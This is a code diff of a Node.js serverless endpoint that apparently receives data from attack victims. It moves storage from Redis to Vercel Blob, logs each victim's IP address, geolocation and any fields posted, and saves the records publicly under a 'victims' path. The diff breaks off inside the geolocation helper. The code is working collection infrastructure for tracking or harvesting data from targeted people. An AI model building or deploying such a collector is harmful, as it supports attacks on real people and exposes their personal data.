@@ -1,8 +1,4 @@
-const { Redis } = require('@upstash/redis');
-const kv = new Redis({
-  url: process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL || 'https://invalid.upstash.io',
-  token: process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN || 'invalid'
-});
+const { put, head } = require('@vercel/blob');
 
 module.exports = async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -11,47 +7,63 @@ module.exports = async function handler(req, res) {
   try {
     const ip = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '0.0.0.0').split(',')[0].trim();
     const body = (req.body && typeof req.body === 'object') ? req.body : {};
-    const id = String(body.x || '').slice(0, 40);
+    const id = String(body.x || '').slice(0, 40).replace(/[^a-zA-Z0-9_-]/g, '');
     if (!id) {
       return res.status(204).end();
     }
 
+    const now = Date.now();
     let geo = null;
-    try {
-      geo = await kv.get('geo:' + ip);
-      if (typeof geo === 'string') geo = JSON.parse(geo);
-    } catch (e) { geo = null; }
-
-    if (!geo) {
+    const geoPath = 'geo/' + ip.replace(/[^a-zA-Z0-9._-]/g, '_') + '.json';
+    const cached = await readJSON(geoPath);
+    if (cached && typeof cached.ts === 'number' &&
+      now - cached.ts < (cached.data && cached.data.err ? 3600e3 : 604800e3)) {
+      geo = cached.data;
+    } else {
       geo = await lookupGeo(ip);
-      if (geo) {
-        try { await kv.set('geo:' + ip, JSON.stringify(geo), { ex: geo.err ? 3600 : 604800 }); } catch (e) {}
-      }
+      if (geo) await writeJSON(geoPath, { ts: now, data: geo });
     }
 
-    let prev = {};
-    try {
-      const raw = await kv.hget('victims', id);
-      if (raw) prev = JSON.parse(raw);
-    } catch (e) {}
-
+    const path = 'victims/' + id + '.json';
+    const prev = (await readJSON(path)) || {};
     const rec = Object.assign({}, prev, body, {
       t: new Date().toISOString(),
-      ip,
+      ip: ip,
       geo: geo || null
     });
-
-    try {
-      const fields = {};
-      fields[id] = JSON.stringify(rec);
-      await kv.hset('victims', fields);
-    } catch (e) {}
+    await writeJSON(path, rec);
 
     return res.status(204).end();
   } catch (e) {
     return res.status(204).end();
   }
 };
+
+async function readJSON(pathname) {
+  try {
+    const meta = await head(pathname);
+    if (!meta || !meta.url) return null;
+    const r = await fetch(meta.url);
+    if (!r.ok) return null;
+    return await r.json();
+  } catch (e) {
+    return null;
+  }
+}
+
+async function writeJSON(pathname, value) {
+  try {
+    await put(pathname, JSON.stringify(value), {
+      access: 'public',
+      allowOverwrite: true,
+      contentType: 'application/json',
+      addRandomSuffix: false
+    });
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
 
 async function lookupGeo(ip) {
   if (!ip || ip === '0.0.0.0' || ip.startsWith('10.') || ip.startsWith('127.') || ip.startsWith('192.168.')) return null;
